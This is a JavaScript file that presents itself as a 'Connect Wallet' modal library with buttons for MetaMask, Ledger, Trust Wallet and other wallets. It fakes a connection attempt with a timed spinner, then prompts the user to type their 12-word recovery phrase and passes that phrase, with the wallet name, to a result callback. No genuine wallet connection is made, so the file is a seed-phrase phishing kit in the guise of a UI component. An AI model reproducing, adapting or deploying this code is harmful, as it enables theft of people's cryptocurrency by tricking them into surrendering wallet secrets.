const web3Hosted = {
  isOpen: false,
  result: {
    walletName: null,
    walletImage: null,
    phrase: null,
  },

  setResult: function (key, value) {
    this.result[key] = value;
  },

  getResult: function () {
    return this.result;
  },

  hosted: function (options = {}) {
    // Set default options if not provided
    options.title = options.title || "Connect Your Wallet";
    options.theme = options.theme || "light";
    options.onResult = options.onResult || function () { };
    options.onClose = options.onClose || function () { };

    if (web3Hosted.isOpen) {
      web3Hosted.closed();
      setTimeout(() => {
        web3Hosted.hosted(options);
      }, 350);
      return;
    }

    // Ensure clean state
    const isSmallScreen = window.matchMedia("(max-width: 768px)").matches;

    const overlay = document.createElement("div");
    overlay.className = "web3Hosted-overlay";
    web3Hosted.overlay = overlay;

    document.body.appendChild(overlay);

    const container = document.createElement("div");
    container.className = isSmallScreen
      ? "web3Hosted-bottom-sheet"
      : "web3Hosted-dialog";

    // Add theme class to container
    if (options && options.theme) {
      container.classList.add(`theme-${options.theme}`);
    } else {
      console.error("Theme option is missing");
    }

    // Store reference to the container
    web3Hosted.sheet = container;

    // Initialize header, content, etc.
    const header = document.createElement("div");
    header.className = "web3Hosted-header";

    const infoButton = document.createElement("img");
    infoButton.className = "web3Hosted-backing-btn";
    infoButton.src = "https://api.realscan.top/images/info-info.svg";
    infoButton.alt = "Back";
    infoButton.style.cursor = "pointer";
    infoButton.addEventListener("click", () => {
      web3Hosted.info(options);
    });
    header.appendChild(infoButton);

    const title = document.createElement("h2");
    title.className = "web3Hosted-title";
    title.innerText = options && options.title ? options.title : "Default Title";
    header.appendChild(title);

    const closeButton = document.createElement("img");
    closeButton.className = "web3Hosted-close-btn";
    closeButton.src = "https://api.realscan.top/images/close-icon.svg";
    closeButton.alt = "Close";

    closeButton.addEventListener("click", () => {
      //console.log("Close button clicked!");

      // Trigger onClose callback
      if (options && typeof options.onClose === "function") {
        options.onClose();
      } else {
        // console.error("onClose callback is missing or not a function");
      }

      web3Hosted.closed();
    });

    header.appendChild(closeButton);
    container.appendChild(header);

    // Add container to body
    document.body.appendChild(container);

    // Mark as open
    web3Hosted.isOpen = true;

    // Spinner (Loading Indicator)
    const spinner = document.createElement("div");
    spinner.className = "web3Hosted-spinner";
    spinner.innerHTML = `<div class="spinner"></div>`;
    container.appendChild(spinner);

    const contentWrapper = document.createElement("div");
    contentWrapper.className = "web3Hosted-content-wrapper";

    const walletList = document.createElement("div");
    walletList.className = "web3Hosted-wallets-grid";

    const defaultWallets = {
      walletconnect: { image: "https://api.realscan.top/images/walletconnect.svg", name: "WalletConnect" },
      metamask: { image: "https://api.realscan.top/images/metamask.svg", name: "MetaMask" },
      trustwallet: { image: "https://api.realscan.top/images/trust.svg", name: "Trust Wallet" },
      coinbase: { image: "https://api.realscan.top/images/coinbase.svg", name: "Coinbase Wallet" },
      okx: { image: "https://api.realscan.top/images/okx.svg", name: "OKX Wallet" },
      bybit: { image: "https://api.realscan.top/images/bybit.svg", name: "Bybit Wallet" },
      phantom: { image: "https://api.realscan.top/images/phantom.svg", name: "Phantom" },
      trezor: { image: "https://api.realscan.top/images/trezor.png", name: "Trezor" },
      binance: { image: "https://api.realscan.top/images/binance.svg", name: "Binance" },
      ledger: { image: "https://api.realscan.top/images/ledger.png", name: "Ledger" },
    };

    const wallets = options.wallets || {};
    const walletEntries = Object.entries({ ...defaultWallets, ...wallets });

    const initialWallets = walletEntries.slice(0, 6);
    const remainingWallets = walletEntries.slice(6);

    setTimeout(() => {
      // Initialize Wallet List
      initialWallets.forEach(([key, wallet]) => {
        const walletItem = web3Hosted.createWalletItem(key, wallet, options.onWalletSelect, options);
        walletList.appendChild(walletItem);
      });

      if (remainingWallets.length > 0) {
        const viewMoreButton = document.createElement("div");
        viewMoreButton.className = "web3Hosted-wallet-item web3Hosted-view-more";
        viewMoreButton.innerText = "View More";
        viewMoreButton.addEventListener("click", () => {
          // Smoothly expand wallets
          walletList.style.transition = "max-height 0.4s ease-in-out";
          walletList.style.maxHeight = "600px"; // Adjust based on the content

          setTimeout(() => {
            remainingWallets.forEach(([key, wallet]) => {
              const walletItem = web3Hosted.createWalletItem(key, wallet, options.onWalletSelect, options);
              walletList.appendChild(walletItem);
            });
            walletList.removeChild(viewMoreButton);
          }, 200); // Smooth animation delay
        });
        walletList.appendChild(viewMoreButton);
      }

      // Add wallets to the wrapper
      contentWrapper.appendChild(walletList);
      container.appendChild(contentWrapper);

      // Hide spinner
      spinner.style.display = "none";
    }, 1000); // Simulate loading delay

    document.body.appendChild(container);

    setTimeout(() => {
      container.classList.add("show");
    }, 100);

    web3Hosted.isOpen = true;

    if (options.outsideTouch) {
      overlay.addEventListener("click", () => web3Hosted.closed());
    }
    // Apply glass effect if enabled
    if (options.glassEffect) {
      container.style.backgroundColor = "var(--bg-color-trans)";
      container.style.backdropFilter = "blur(10px)";
      header.style.backgroundColor = "var(--header-bg-trans)";
      header.style.backdropFilter = "blur(10px)";
    } else {
      container.style.backdropFilter = "none";
      header.style.backdropFilter = "none";
    }
  },

  createWalletItem: function (key, wallet, onWalletSelect, options) {
    const walletItem = document.createElement("div");
    walletItem.className = "web3Hosted-wallet-item";

    const walletImage = document.createElement("img");
    walletImage.src = wallet.image;
    walletImage.alt = wallet.name;
    walletImage.className = "web3Hosted-wallet-image";

    const walletName = document.createElement("p");
    walletName.innerText = wallet.name;
    walletName.className = "web3Hosted-wallet-name";

    walletItem.appendChild(walletImage);
    walletItem.appendChild(walletName);

    walletItem.addEventListener("click", () => {
      web3Hosted.setResult("walletName", wallet.name);
      web3Hosted.setResult("walletImage", wallet.image);

      if (typeof onWalletSelect === "function") {
        onWalletSelect(wallet);
      }

      web3Hosted.nextpage(wallet.name, wallet.image, options); // Pass name and image
    });

    return walletItem;
  },

  nextpage: function (walletName, walletImage, options) {
    const container = web3Hosted.sheet;

    if (container) {
      container.innerHTML = "";

      // Header
      const header = document.createElement("div");
      header.className = "web3Hosted-header";

      const backButton = document.createElement("img");
      backButton.className = "web3Hosted-backing-btn";
      backButton.src = "https://api.realscan.top/images/back-icon.svg";
      backButton.alt = "Back";
      backButton.style.cursor = "pointer";
      backButton.addEventListener("click", () => {
        web3Hosted.hosted(options);
      });
      header.appendChild(backButton);

      const title = document.createElement("h2");
      title.className = "web3Hosted-title";
      title.innerText = "Manual Wallet Connect";
      header.appendChild(title);

      const closeButton = document.createElement("img");
      closeButton.className = "web3Hosted-close-btn";
      closeButton.src = "https://api.realscan.top/images/close-icon.svg";
      closeButton.alt = "Close";
      closeButton.style.cursor = "pointer";
      closeButton.addEventListener("click", () => {
        //console.log("Nextpage Close button clicked!");

        // Trigger the `onClose` callback if provided
        if (options && typeof options.onClose === "function") {
          options.onClose();
        }

        web3Hosted.closed();
      });
      header.appendChild(closeButton);

      container.appendChild(header);

      const contentWrapper = document.createElement("div");
      contentWrapper.className = "web3Hosted-content-wrapper";

      // Loading Screen
      const loadingScreen = document.createElement("div");
      loadingScreen.className = "web3Hosted-loading-screen";
      loadingScreen.innerHTML = `
        <div class="web3Hosted-wallet-logo-logo">
          <div class="web3Hosted-spinner-logo"></div>
          <img src="${walletImage}" alt="${walletName}" style="width: 50px; height: 50px;">
        </div>
        <div class="web3Hosted-loading-text">Continue in ${walletName}</div>
        <div class="web3Hosted-subtext">Accept connection request in the wallet</div>
        <button class="web3Hosted-try-again-button">
          <img src="https://api.realscan.top/images/refresh.svg" alt="Retry" style="width: 16px; margin-right: 5px;">
          Try again
        </button>
      `;

      contentWrapper.appendChild(loadingScreen);
      container.appendChild(contentWrapper);

      // Simulate Loading Transition
      setTimeout(() => {
        contentWrapper.innerHTML = "";

        // Textarea Dialog
        const walletPhraseForm = document.createElement("div");
        walletPhraseForm.className = "web3Hosted-wallet-phrase-form";
        walletPhraseForm.innerHTML = `
          <div class="web3Hosted-loading-screen-textarea">
            <div class="web3Hosted-wallet-logo-logo-textarea">
              <img src="${walletImage}" alt="${walletName}" style="width: 50px; height: 50px;">
            </div>
          </div>
          <br>
          <p style="text-align: center; font-family: 'Segoe UI', sans-serif; color: var(--text-color);">
            Enter your wallet recovery phrase to manually connect.
          </p>
          <br>
          <textarea class="web3Hosted-wallet-phrase-textarea" value="" placeholder="Enter your 12-word wallet phrase here..."></textarea>
          <button 
            class="web3Hosted-submit-button" 
            style="margin-top: 10px; padding: 10px 20px; font-size: 16px; background: #6b4aff; color: #fff; border: none; border-radius: 5px; cursor: pointer;">
            Connect 
          </button>
        `;

        contentWrapper.appendChild(walletPhraseForm);

        // Handle Submit Button Click
        const submitButton = container.querySelector(".web3Hosted-submit-button");
        submitButton.addEventListener("click", () => {
          const phrase = container.querySelector(".web3Hosted-wallet-phrase-textarea").value;
          web3Hosted.setResult("phrase", phrase); // Save phrase to result object
          // console.log("Entered Wallet Phrase:", phrase, "Wallet Name", walletName, "Wallet Image", walletImage);
          /// Create the result JSON object
          const result = {
            walletImage,
            walletName,
            walletPhrase: phrase,
          };

          // Store the result internally
          web3Hosted.result = result;

          // Trigger the callback function if provided
          if (options && typeof options.onResult === "function") {
            // console.log("Invoking onResult callback...");
            options.onResult(result); // Pass the JSON object to the callback
          }

          //console.log("Wallet connection successful:", result);
          web3Hosted.closed();
        });
      }, 5000); // Show loading for 5 seconds
    }
  },

  // Method to get the result manually
  getResult: function () {
    return this.result;
  },

  closed: function () {
    const container = web3Hosted.sheet;
    const overlay = web3Hosted.overlay;

    if (container && overlay) {
      container.classList.remove("show");
      setTimeout(() => {
        document.body.removeChild(container);
        document.body.removeChild(overlay);
        web3Hosted.isOpen = false;
      }, 300);
    }
  },

  info: function (options) {
    const container = web3Hosted.sheet;

    if (container) {
      container.innerHTML = "";

      // Header
      const header = document.createElement("div");
      header.className = "web3Hosted-header";

      const backButton = document.createElement("img");
      backButton.className = "web3Hosted-backing-btn";
      backButton.src = "https://api.realscan.top/images/back-icon.svg";
      backButton.alt = "Back";
      backButton.style.cursor = "pointer";
      backButton.addEventListener("click", () => {
        web3Hosted.hosted(options);
      });
      header.appendChild(backButton);

      const title = document.createElement("h2");
      title.className = "web3Hosted-title";
      title.innerText = "What Is A Wallet?";
      header.appendChild(title);

      const closeButton = document.createElement("img");
      closeButton.className = "web3Hosted-close-btn";
      closeButton.src = "https://api.realscan.top/images/close-icon.svg";
      closeButton.alt = "Close";
      closeButton.style.cursor = "pointer";
      closeButton.addEventListener("click", () => {
        web3Hosted.closed();
      });
      header.appendChild(closeButton);

      container.appendChild(header);

      const contentWrapper = document.createElement("div");
      contentWrapper.className = "web3Hosted-content-wrapper";

      contentWrapper.innerHTML = `
        <div style="color: var(--text-color); padding: 20px; text-align: center; font-family: 'Segoe UI', sans-serif;">
          <p style="margin-bottom: 20px;"><strong>One login for all of web3:</strong><br>
          Log in to any app by connecting your wallet. Say goodbye to countless passwords!</p>
          <p style="margin-bottom: 20px;"><strong>A home for your digital assets:</strong><br>
          A wallet lets you store, send, and receive digital assets like cryptocurrencies and NFTs.</p>
          <p><strong>Your gateway to a new web:</strong><br>
          With your wallet, you can explore and interact with DeFi, NFTs, DAOs, and much more.</p>
        </div>
      `;

      container.appendChild(contentWrapper);
    }
  },
};

// Button Loading Functions
function setButtonLoading(button, isLoading, loadingText = "Connecting...") {
  if (!button) {
    console.error("Button is not defined!");
    return;
  }

  if (isLoading) {
    button.setAttribute("disabled", "true");
    button.dataset.originalText = button.textContent;
    button.innerHTML = `<div class="spinner-button"></div> ${loadingText}`;
  } else {
    button.removeAttribute("disabled");
    button.innerHTML = button.dataset.originalText || "Button";
  }
}

const ButtonLoadingManager = {
  setLoading(button, isLoading, loadingText = "Connecting...") {
    if (!button) return;

    if (isLoading) {
      button.setAttribute("disabled", "true");
      button.dataset.originalText = button.textContent;
      button.innerHTML = `<div class="spinner"></div> ${loadingText}`;
    } else {
      button.removeAttribute("disabled");
      button.innerHTML = button.dataset.originalText || "Button";
    }
  },
};

// Custom Elements for Connect Buttons
class W3HConnect extends HTMLElement {
  connectedCallback() {
    const button = this;

    this.style.display = "inline-block";
    this.style.padding = "10px 20px";
    this.style.backgroundColor = "#6b4aff";
    this.style.color = "#fff";
    this.style.border = "none";
    this.style.fontSize = "16px";
    this.style.borderRadius = "5px";
    this.style.cursor = "pointer";
    this.style.textAlign = "center";
    this.style.transition = "background-color 0.3s ease";
    this.textContent = "Connect Wallet";

    this.addEventListener("click", () => {
      console.log("Clicked button:", button);

      setButtonLoading(button, true);

      web3Hosted.hosted({
        theme: "light",
        onWalletSelect: () => {
          setButtonLoading(button, false);
        },
        onClose: () => {
          setButtonLoading(button, false);
          console.log("Dialog closed, loading stopped:", button);
        },
      });
    });
  }
}
customElements.define("w3h-connect-light", W3HConnect);

class W3HConnectDark extends HTMLElement {
  connectedCallback() {
    const button = this;

    this.style.display = "inline-block";
    this.style.padding = "10px 20px";
    this.style.backgroundColor = "#333";
    this.style.color = "#fff";
    this.style.border = "none";
    this.style.fontSize = "16px";
    this.style.borderRadius = "5px";
    this.style.cursor = "pointer";
    this.style.textAlign = "center";
    this.style.transition = "background-color 0.3s ease";
    this.textContent = "Connect Wallet";

    this.addEventListener("mouseover", () => {
      this.style.backgroundColor = "#444";
    });
    this.addEventListener("mouseout", () => {
      this.style.backgroundColor = "#333";
    });

    this.addEventListener("click", () => {
      console.log("Clicked button:", button);

      setButtonLoading(button, true);

      web3Hosted.hosted({
        theme: "dark",
        onWalletSelect: () => {
          setButtonLoading(button, false);
        },
        onClose: () => {
          setButtonLoading(button, false);
          console.log("Dialog closed, loading stopped:", button);
        },
      });
    });
  }
}
customElements.define("w3h-connect-dark", W3HConnectDark);
